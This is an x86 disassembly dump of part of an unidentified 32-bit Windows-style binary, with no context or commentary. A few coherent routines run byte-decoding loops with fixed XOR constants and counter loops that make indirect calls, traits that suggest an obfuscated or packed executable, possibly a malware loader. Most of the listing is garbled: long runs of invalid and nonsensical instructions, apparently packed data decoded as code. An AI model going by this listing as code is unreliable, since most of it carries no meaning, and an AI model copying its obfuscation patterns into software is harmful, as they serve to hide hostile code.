  4038e6:	enter  0x33fc,0xc1
  4038ea:	add    eax,edx
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43442d,0x11
  403938:	cmp    DWORD PTR ds:0x43442d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43442d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43437a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432c26
  403960:	mov    eax,ds:0x43442d
  403965:	dec    eax
  403966:	mov    ds:0x43442d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432dca
  403975:	add    DWORD PTR ds:0x432de2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4326f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43441d
  40399d:	sub    DWORD PTR ds:0x4343a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434429
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434396
  4039c1:	xor    ecx,DWORD PTR ds:0x43439a
  4039c7:	mov    DWORD PTR ds:0x434396,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432dbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432dbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432dbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43438a
  4039f9:	push   0x43275d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432c2a
  403a11:	mov    ecx,DWORD PTR ds:0x432dbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432dbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4326f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43437e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432dde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432dde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432dde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432de6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43439e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432c2e
  403a7c:	cmp    DWORD PTR ds:0x432dde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432dde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432dde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432dde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432dde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43439a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434396,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0xffffffe5
  403ae4:	ds cs shr esp,1
  403ae8:	push   ds
  403ae9:	jo     0x403b5b
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403aed
  403af0:	adc    al,0x9e
  403af2:	pop    ecx
  403af3:	pop    edx
  403af4:	cmp    DWORD PTR [ebx],0x7d
  403af7:	xchg   DWORD PTR [eax],ebx
  403af9:	iret   
  403afa:	push   ebx
  403afb:	pop    ebp
  403afc:	push   eax
  403afd:	dec    eax
  403afe:	jo     0x403aa1
  403b00:	dec    ebx
  403b01:	mov    al,0x76
  403b03:	mov    ebp,0x5b21d3a3
  403b08:	ja     0x403a9e
  403b0a:	idiv   ebx
  403b0c:	ss mov ch,0xc1
  403b0f:	inc    edi
  403b10:	pop    edi
  403b11:	and    ch,dh
  403b13:	cmp    eax,eax
  403b15:	or     DWORD PTR [ebx],ebx
  403b17:	jp     0x403b27
  403b19:	adc    dl,bl
  403b1b:	bound  ebx,QWORD PTR [ecx]
  403b1d:	inc    edi
  403b1e:	mov    BYTE PTR [ebx],ah
  403b20:	jnp    0x403b82
  403b22:	dec    edi
  403b23:	scas   eax,DWORD PTR es:[edi]
  403b24:	pop    es
  403b25:	push   ecx
  403b26:	icebp  
  403b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b28:	loopne 0x403b7c
  403b2a:	scas   eax,DWORD PTR es:[edi]
  403b2b:	and    ch,BYTE PTR [ebx]
  403b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b2e:	and    ecx,DWORD PTR [ebp-0x3737b8b]
  403b34:	dec    esp
  403b35:	test   BYTE PTR ds:0xb7e1ffc,bl
  403b3b:	dec    eax
  403b3c:	loope  0x403b5b
  403b3e:	and    BYTE PTR [eax-0x49],bh
  403b41:	xor    ch,al
  403b43:	mov    bl,0xe8
  403b45:	sub    esp,DWORD PTR [esi+0x1c]
  403b48:	pusha  
  403b49:	ret    
  403b4a:	fs out dx,al
  403b4c:	and    ch,bl
  403b4e:	or     BYTE PTR [eax-0x7085b59f],ch
  403b54:	jae    0x403b67
  403b56:	mov    bh,0x65
  403b58:	frstor [esi]
  403b5a:	pusha  
  403b5b:	jmp    0x281c:0xb61d4bea
  403b62:	xchg   esi,eax
  403b63:	(bad)  [edx]
  403b65:	mov    ebp,0xab6231cd
  403b6a:	xchg   esi,eax
  403b6b:	add    dl,BYTE PTR [edi+ebx*4]
  403b6e:	nop
  403b6f:	add    eax,DWORD PTR [ebp-0x6e77e7f0]
  403b75:	inc    esi
  403b76:	cmp    eax,0x7870ded0
  403b7b:	loopne 0x403b65
  403b7d:	in     eax,0x8d
  403b7f:	add    dl,BYTE PTR [esi]
  403b81:	arpl   WORD PTR [ebp-0x4483275c],si
  403b87:	retf   
  403b88:	inc    eax
  403b89:	ins    DWORD PTR es:[edi],dx
  403b8a:	pop    esi
  403b8b:	cs into 
  403b8d:	nop
  403b8e:	push   ebp
  403b8f:	aaa    
  403b90:	out    0x17,eax
  403b92:	out    0x6f,eax
  403b94:	mov    al,0xf5
  403b96:	push   esi
  403b97:	rcr    DWORD PTR es:[edi-0x6b],1
  403b9b:	mov    DWORD PTR [edi+eiz*2+0x13],ecx
  403b9f:	mov    dl,0x16
  403ba1:	pop    ss
  403ba2:	jge    0x403b6a
  403ba4:	or     ebp,ebp
  403ba6:	cmp    ch,BYTE PTR [ebx+0x41]
  403ba9:	and    ebx,DWORD PTR [edx+0x425c212d]
  403baf:	rcr    ecx,1
  403bb1:	mov    ?,WORD PTR [esp+edx*1]
  403bb4:	mov    bh,0xaf
  403bb6:	imul   esi,DWORD PTR [ebx+0x13],0x6e0b6e5a
  403bbd:	xor    BYTE PTR [ecx+0x2d4960fa],dh
  403bc3:	mov    dl,0x55
  403bc5:	daa    
  403bc6:	sbb    eax,0x6dbb3043
  403bcb:	sahf   
  403bcc:	in     eax,0xc0
  403bce:	push   ss
  403bcf:	pop    DWORD PTR [eax+0x16164045]
  403bd5:	daa    
  403bd6:	push   ds
  403bd7:	inc    esp
  403bd8:	jp     0x403bc7
  403bda:	jmp    0x403b76
  403bdc:	fst    QWORD PTR [eax+0x882cf0]
  403be2:	iret   
  403be3:	dec    edx
  403be4:	(bad)  
  403be5:	dec    eax
  403be6:	popf   
  403be7:	push   ebx
  403be8:	sbb    eax,0xcb508cbb
  403bed:	stc    
  403bee:	fstp   st(4)
  403bf0:	stc    
  403bf1:	cmp    DWORD PTR [esi+0x35],esp
  403bf4:	outs   dx,BYTE PTR ds:[esi]
  403bf5:	pushf  
  403bf6:	cmp    edx,0xffffffd9
  403bf9:	je     0x403c76
  403bfb:	mov    ch,0x16
  403bfd:	mul    eax
  403bff:	sub    DWORD PTR [ebx],ecx
  403c01:	cli    
  403c02:	mov    edi,0xfc07b79c
  403c07:	out    dx,eax
  403c08:	mov    eax,ds:0xebeea71d
  403c0d:	xor    ebx,eax
  403c0f:	vpunpckldq xmm3,xmm3,XMMWORD PTR [esi-0x50]
  403c14:	(bad)  
  403c15:	shl    cl,cl
  403c17:	push   esi
  403c18:	inc    esi
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434376,0x434421
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432dd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43436a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	sbb    cl,BYTE PTR [ebx+0x1d941c12]
  403c67:	jo     0x403cd9
  403c69:	sbb    BYTE PTR [edi+0x70],bh
  403c6c:	jo     0x403cc4
  403c6e:	sbb    al,0xb4
  403c70:	sbb    eax,0x4d0ecb5c
  403c75:	fs test eax,0x5acb7328
  403c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c7d:	xor    al,0x4
  403c7f:	stos   BYTE PTR es:[edi],al
  403c80:	jno    0x403ca2
  403c82:	fnstenv [ecx-0x44]
  403c85:	inc    esp
  403c86:	rcl    BYTE PTR [esi],cl
  403c88:	push   es
  403c89:	test   BYTE PTR [bx+si],dh
  403c8c:	popa   
  403c8d:	mov    ebx,ebx
  403c8f:	inc    ebx
  403c90:	imul   BYTE PTR [esi-0x14c6a41f]
  403c96:	(bad)  
  403c97:	cwde   
  403c98:	inc    ebx
  403c99:	add    BYTE PTR [edx-0x3b994755],al
  403c9f:	imul   eax,DWORD PTR [ecx-0x229260c9],0x76
  403ca6:	loope  0x403c77
  403ca8:	test   eax,0x71c7b205
  403cad:	jo     0x403d0f
  403caf:	xor    bl,cl
  403cb1:	xor    eax,0xeac8f334
  403cb6:	mov    edx,0x2f4f055e
  403cbb:	sub    al,BYTE PTR [ecx+0x74]
  403cbe:	xchg   ecx,eax
  403cbf:	mov    WORD PTR [ecx-0x6c],es
  403cc2:	adc    ebp,DWORD PTR [ebp-0x6f]
  403cc5:	xlat   BYTE PTR ds:[ebx]
  403cc6:	out    0x39,eax
  403cc8:	mov    ch,0x75
  403cca:	cmovge edi,DWORD PTR [ebx+ecx*8+0x13]
  403ccf:	sbb    eax,0x6fc2790b
  403cd4:	inc    esp
  403cd5:	out    dx,al
  403cd6:	loopne 0x403d4b
  403cd8:	pushaw 
  403cda:	push   ds
  403cdb:	mov    bl,0x39
  403cdd:	cmp    eax,0x898dcbab
  403ce2:	mov    eax,0xec4b6027
  403ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ce8:	out    dx,al
  403ce9:	sbb    eax,0xffffffa2
  403cec:	out    dx,eax
  403ced:	cwde   
  403cee:	push   0x5a
  403cf0:	shl    BYTE PTR [esi+0x7c9cead9],1
  403cf6:	inc    eax
  403cf7:	push   ecx
  403cf8:	sbb    ebx,DWORD PTR [esi-0x59]
  403cfb:	adc    eax,ebx
  403cfd:	lahf   
  403cfe:	cmp    esp,0xffffff8a
  403d01:	and    edx,ebp
  403d03:	sub    dh,BYTE PTR [edx-0x32]
  403d06:	mov    ah,0x11
  403d08:	pop    es
  403d09:	mov    al,ds:0xef32da3b
  403d0e:	repnz or BYTE PTR [eax+esi*2+0x38],bl
  403d13:	sub    BYTE PTR [ebp+0x60c3a163],dl
  403d19:	push   es
  403d1a:	sub    BYTE PTR [eax],al
  403d1c:	xchg   ecx,eax
  403d1d:	clc    
  403d1e:	scas   eax,DWORD PTR es:[edi]
  403d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d21:	xor    DWORD PTR [esi],esi
  403d23:	clc    
  403d24:	dec    eax
  403d25:	mov    eax,0x202b6ecb
  403d2a:	cmc    
  403d2b:	pop    esi
  403d2c:	shl    DWORD PTR [esi+0x10],cl
  403d2f:	sbb    ch,BYTE PTR [ebx+0xb]
  403d32:	mov    eax,0xdfe9e23b
  403d37:	sub    al,0xab
  403d39:	lea    edx,[edx-0x7d]
  403d3c:	mov    bh,0xd8
  403d3e:	inc    esp
  403d3f:	inc    esp
  403d40:	xor    ecx,0x4a1beb34
  403d46:	mul    BYTE PTR [ebx]
  403d48:	dec    ebx
  403d49:	mov    esi,0x98210ade
  403d4e:	pusha  
  403d4f:	xchg   ebp,eax
  403d50:	and    eax,0x80d42759
  403d55:	js     0x403d9b
  403d57:	and    bl,dl
  403d59:	repnz mov bp,0x51a6
  403d5e:	mov    eax,ds:0x39916e9e
  403d63:	outs   dx,BYTE PTR ds:[esi]
  403d64:	mov    ds:0x7844aae3,al
  403d69:	push   ecx
  403d6a:	ss sbb dl,dh
  403d6d:	inc    esi
  403d6e:	dec    eax
  403d6f:	jecxz  0x403d26
  403d71:	dec    ebx
  403d72:	sbb    DWORD PTR [ecx+0x75],esp
  403d75:	aas    
  403d76:	adc    ebp,DWORD PTR [ecx+eax*4+0x754af143]
  403d7d:	xchg   esi,eax
  403d7e:	jno    0x403d75
  403d80:	push   ebx
  403d81:	add    ecx,DWORD PTR [esi-0x5ad55343]
  403d87:	dec    ebx
  403d88:	jbe    0x403d2f
  403d8a:	cmp    al,0xed
  403d8c:	pop    ds
  403d8d:	stc    
  403d8e:	loop   0x403e0e
  403d90:	and    ecx,DWORD PTR [edi+0x62]
  403d93:	mov    ecx,0xa0820fc6
  403d98:	(bad)  
  403d99:	(bad)  
  403d9a:	dec    DWORD PTR [ebx+0x2581f855]
  403da0:	call   0x0:0x4343
  403da7:	add    cl,ch
  403da9:	push   cs
  403daa:	add    BYTE PTR [eax],al
  403dac:	add    BYTE PTR [ebx],dh
  403dae:	rol    BYTE PTR [ebx],0x5
  403db1:	call   0x9aa3:0x40004343
  403db8:	inc    ebx
  403db9:	inc    ebx
  403dba:	add    BYTE PTR [ebx+0x43439a3d],al
  403dc0:	add    BYTE PTR [ebx],dl
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43439a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4329be
  403dde:	cmp    DWORD PTR ds:0x43439a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43439a
  403df3:	inc    eax
  403df4:	mov    ds:0x43439a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	jnp    0x403de1
  403e1a:	or     DWORD PTR [edi],edx
  403e1c:	mov    esp,0x1870701c
  403e21:	jg     0x403e93
  403e23:	jo     0x403e02
  403e25:	and    ah,BYTE PTR [ecx]
  403e27:	fld    st(1)
  403e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e2a:	jae    0x403e00
  403e2c:	popa   
  403e2d:	push   edx
  403e2e:	addr16 push edx
  403e30:	push   ss
  403e31:	push   esi
  403e32:	in     al,0x88
  403e34:	stos   BYTE PTR es:[edi],al
  403e35:	inc    ecx
  403e36:	mov    ch,0x6
  403e38:	shl    BYTE PTR [edi+ebx*4],0x2a
  403e3c:	in     al,0xbf
  403e3e:	neg    DWORD PTR [ecx+0x7809faa0]
  403e44:	std    
  403e45:	mov    WORD PTR [ebp-0x577128e0],ds
  403e4b:	mov    edi,0xf8a6ac13
  403e50:	test   al,0x91
  403e52:	xchg   BYTE PTR [edi-0x1f],cl
  403e55:	cmp    DWORD PTR [ebx-0x78],edx
  403e58:	fild   WORD PTR [ecx-0x64]
  403e5b:	(bad)  
  403e5c:	fwait
  403e5d:	sbb    DWORD PTR [eax-0x7c09ceb1],eax
  403e63:	mov    ah,BYTE PTR [ecx-0x4f988a5d]
  403e69:	dec    edi
  403e6a:	sub    DWORD PTR [edx-0x6b7e923c],esp
  403e70:	sub    eax,0x784a757f
  403e75:	push   esi
  403e76:	inc    ecx
  403e77:	dec    ebp
  403e78:	fbld   TBYTE PTR [ebx-0x595142e7]
  403e7e:	shl    BYTE PTR [ebp+0x29],0xa5
  403e82:	cmp    eax,0xfe1327a0
  403e87:	in     eax,0xcf
  403e89:	shl    bh,0xba
  403e8c:	pop    ss
  403e8d:	jecxz  0x403e38
  403e8f:	repnz or eax,0xbc0b3ad2
  403e95:	sub    edx,eax
  403e97:	daa    
  403e98:	jg     0x403e8b
  403e9a:	in     eax,dx
  403e9b:	mov    ecx,0x38dcd2e6
  403ea0:	xchg   ecx,eax
  403ea1:	xor    al,0x64
  403ea3:	push   ebx
  403ea4:	or     al,dh
  403ea6:	sar    BYTE PTR [ebp-0x3fa7d99b],cl
  403eac:	int3   
  403ead:	lahf   
  403eae:	mov    BYTE PTR [ecx],ah
  403eb0:	inc    esp
  403eb1:	fisubr DWORD PTR [edi+0xf2fd53b]
  403eb7:	inc    esi
  403eb8:	nop
  403eb9:	pop    es
  403eba:	clc    
  403ebb:	xor    eax,DWORD PTR [ebp-0x171cddea]
  403ec1:	mov    cl,0xf2
  403ec3:	scas   al,BYTE PTR es:[edi]
  403ec4:	repnz xchg edx,eax
  403ec6:	aad    0x6f
  403ec8:	fdivp  st(2),st
  403eca:	cmp    al,BYTE PTR [ecx-0x280f0022]
  403ed0:	dec    eax
  403ed1:	push   0x5
  403ed3:	or     ah,BYTE PTR [esi]
  403ed5:	mov    edi,0xe6b8fed
  403eda:	shr    DWORD PTR [edx],1
  403edc:	mov    ebx,0x26a0775f
  403ee1:	(bad)
  403ee4:	pop    edi
  403ee5:	mov    cs,esi
  403ee7:	mov    bl,0xe1
  403ee9:	stos   DWORD PTR es:[edi],eax
  403eea:	fisubr WORD PTR [ebx-0x10]
  403eed:	ja     0x403f12
  403eef:	xchg   edx,eax
  403ef0:	sti    
  403ef1:	test   BYTE PTR ds:0x32cbe236,bl
  403ef7:	xor    al,0x7a
  403ef9:	sbb    dh,BYTE PTR [ecx]
  403efb:	fld    QWORD PTR [edx+esi*2-0x53]
  403eff:	aaa    
  403f00:	retf   0x5602
  403f03:	jbe    0x403eef
  403f05:	stos   DWORD PTR es:[edi],eax
  403f06:	in     al,0x73
  403f08:	mov    edx,0x985aa0c
  403f0d:	or     bh,bl
  403f0f:	(bad)  
  403f10:	stc    
  403f11:	sbb    DWORD PTR [edi],esp
  403f13:	cwde   
  403f14:	cmp    cl,BYTE PTR [edx-0x7febe6d9]
  403f1a:	cs xchg ebx,eax
  403f1c:	add    bl,dh
  403f1e:	cmc    
  403f1f:	inc    ecx
  403f20:	jno    0x403f90
  403f22:	mov    bh,0x13
  403f24:	fmul   DWORD PTR [edi]
  403f26:	pop    es
  403f27:	fisttp QWORD PTR [eax-0x40]
  403f2a:	clc    
  403f2b:	jbe    0x403f89
  403f2d:	xchg   ebx,eax
  403f2e:	aam    0xcf
  403f30:	or     ah,al
  403f32:	cmp    ebp,DWORD PTR [ecx]
  403f34:	pushf  
  403f35:	xchg   DWORD PTR [eax],edi
  403f37:	or     bh,BYTE PTR [ebx-0x6f]
  403f3a:	into   
  403f3b:	push   cs
  403f3c:	pushf  
  403f3d:	fwait
  403f3e:	mov    ds:0xb9fb68a0,eax
  403f43:	je     0x403ef3
  403f45:	shl    BYTE PTR [edx],cl
  403f47:	inc    esp
  403f48:	push   ebp
  403f49:	(bad)  
  403f4a:	and    bh,BYTE PTR [ecx]
  403f4c:	je     0x4040d7
  403f52:	push   ebx
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	outs   dx,BYTE PTR ds:[esi]
  403fa3:	aas    
  403fa4:	push   ebx
  403fa5:	repz sbb esi,DWORD PTR fs:[eax+0x70]
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x403f51
  403faf:	mov    dh,0xbc
  403fb1:	sub    eax,DWORD PTR [eax+ecx*2]
  403fb4:	pop    es
  403fb5:	(bad)  
  403fb6:	aad    0x8e
  403fb8:	test   al,0xf1
  403fba:	ds push 0x8137bc29
  403fc0:	ins    DWORD PTR es:[edi],dx
  403fc1:	loop   0x404020
  403fc3:	and    bl,BYTE PTR [esi+0x2738a09c]
  403fc9:	adc    BYTE PTR [ecx+0x1f9300f],dl
  403fcf:	in     al,dx
  403fd0:	cmc    
  403fd1:	aam    0x5d
  403fd3:	aad    0x9d
  403fd5:	cmp    eax,0xed45a355
  403fda:	lea    esi,ds:0x73b9498c
  403fe0:	adc    dl,BYTE PTR [eax+0x26]
  403fe3:	fnstenv [eax+0x5d]
  403fe6:	push   ds
  403fe7:	les    ecx,FWORD PTR [edi-0x3d8b4b61]
  403fed:	repz sbb BYTE PTR [edx+edi*2+0xb144709],ch
  403ff5:	neg    BYTE PTR [ecx+0x342e9fb9]
  403ffb:	or     bl,dh
  403ffd:	stos   DWORD PTR es:[edi],eax
  403ffe:	xor    DWORD PTR [eax+edi*1+0x4e3dda2f],ebx
  404005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404006:	xor    eax,0x76e31c26
  40400b:	stos   BYTE PTR es:[edi],al
  40400c:	fwait
  40400d:	std    
  40400e:	lods   eax,DWORD PTR ds:[esi]
  404010:	dec    ebp
  404011:	repz fisubr DWORD PTR ds:0x793b61a9
  404018:	mov    BYTE PTR [ebp+0x66cf5fd2],dh
  40401e:	sbb    bl,BYTE PTR [ebx+0x5f8ec7ca]
  404024:	dec    esi
  404025:	cmp    al,0xba
  404027:	fld    QWORD PTR [ecx]
  404029:	xor    edi,DWORD PTR [bp+di+0x68b]
  40402e:	je     0x4040a9
  404030:	sub    DWORD PTR [edx],ebx
  404032:	aad    0xca
  404034:	and    al,0xa6
  404036:	push   0x67b2d168
  40403b:	mov    ecx,0x2cc76f31
  404040:	push   ebx
  404041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404042:	pop    ds
  404043:	(bad)  
  404044:	xchg   edi,eax
  404045:	inc    ecx
  404046:	data16 fisttp WORD PTR [edx+eiz*4-0x32]
  40404b:	sbb    BYTE PTR [ecx+edi*4-0x3d],ch
  40404f:	adc    BYTE PTR [eax+0x400c2b6f],0xde
  404056:	out    0xa3,eax
  404058:	or     edi,DWORD PTR [ebx]
  40405a:	xor    esi,DWORD PTR [ecx]
  40405c:	aad    0x9b
  40405e:	sub    BYTE PTR ds:0x7f8ae51b,bh
  404064:	scas   eax,DWORD PTR es:[edi]
  404065:	shl    BYTE PTR [edx+0x25],cl
  404068:	sub    cl,BYTE PTR [eax]
  40406a:	jge    0x4040a4
  40406c:	or     BYTE PTR [esi+0x787165c8],0x71
  404073:	or     eax,0xd1ba3e9b
  404078:	adc    al,BYTE PTR [ebp+0x7a557e1f]
  40407e:	pop    ss
  40407f:	dec    ecx
  404080:	jmp    0x404010
  404082:	test   eax,0x8f62dad
  404087:	mov    DWORD PTR [ebx+0x20482cfd],0x57231f08
  404091:	pop    esi
  404092:	xchg   ecx,eax
  404093:	icebp  
  404094:	mov    al,ds:0x9fa53237
  404099:	dec    esp
  40409a:	cmp    DWORD PTR [ebp-0x1bb5bc20],edx
  4040a0:	cmp    DWORD PTR [ebp-0x7a],ebx
  4040a3:	add    eax,0xd31b3b6c
  4040a8:	aaa    
  4040a9:	enter  0xcb83,0xd0
  4040ad:	mov    ebp,0xf1f3b946
  4040b2:	cmp    bl,dl
  4040b4:	fwait
  4040b5:	jp     0x404052
  4040b7:	xchg   ebx,eax
  4040b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040b9:	ds scas eax,DWORD PTR es:[edi]
  4040bb:	sub    BYTE PTR [ebx+eax*4],bh
  4040be:	rol    al,1
  4040c0:	mov    al,0x30
  4040c2:	add    dl,BYTE PTR [ecx+0x12]
  4040c5:	enter  0xba03,0x8
  4040c9:	in     eax,dx
  4040ca:	cli    
  4040cb:	mov    WORD PTR [ebx+0x4944b688],bp
  4040d2:	aam    0x7d
  4040d4:	and    ch,cl
  4040d6:	pop    ebx
  4040d7:	mov    eax,DWORD PTR [ebp-0x8]
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx+0x3a5c2f01],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x4040ce
  4040fb:	leave  
  4040fc:	lea    edi,[edi-0x6a]
  4040ff:	and    DWORD PTR [ecx+0x2c8f715c],ebx
  404105:	sahf   
  404106:	enter  0xe35e,0x9c
  40410a:	loopne 0x4040f6
  40410c:	jecxz  0x404148
  40410e:	in     eax,0x6a
  404110:	out    0x85,eax
  404112:	pop    esp
  404113:	xor    al,0x21
  404115:	(bad)  
  404116:	jnp    0x40410f
  404118:	pop    es
  404119:	lds    eax,FWORD PTR [eax-0x66]
  40411c:	sub    BYTE PTR ds:0x30be5383,0xa6
  404123:	mov    DWORD PTR fs:[ecx],ebp
  404126:	test   esp,edi
  404128:	push   edx
  404129:	inc    ecx
  40412a:	xchg   edi,eax
  40412b:	jg     0x4040fe
  40412d:	cld    
  40412e:	clc    
  40412f:	arpl   WORD PTR [edx-0x2bc573f0],cx
  404135:	push   esi
  404136:	inc    ecx
  404137:	push   esi
  404138:	sbb    BYTE PTR [edx+0x7c],0x94
  40413c:	into   
  40413d:	adc    DWORD PTR [ecx-0x125b82d7],0x4
  404144:	loop   0x404119
  404146:	sbb    DWORD PTR [edi],0x3bc6a99d
  40414c:	xchg   esi,eax
  40414d:	push   ds
  40414e:	push   esp
  40414f:	stos   DWORD PTR es:[edi],eax
  404150:	pop    esi
  404151:	inc    ebp
  404152:	mov    BYTE PTR [esi],al
  404154:	push   esi
  404155:	mov    eax,ds:0x582ad535
  40415a:	shl    esp,1
  40415c:	mov    dh,0xab
  40415e:	cs push ss
  404160:	inc    esp
  404161:	jns    0x404108
  404163:	int3   
  404164:	scas   al,BYTE PTR es:[edi]
  404165:	int    0x5f
  404167:	hlt    
  404168:	mov    ecx,DWORD PTR [edi]
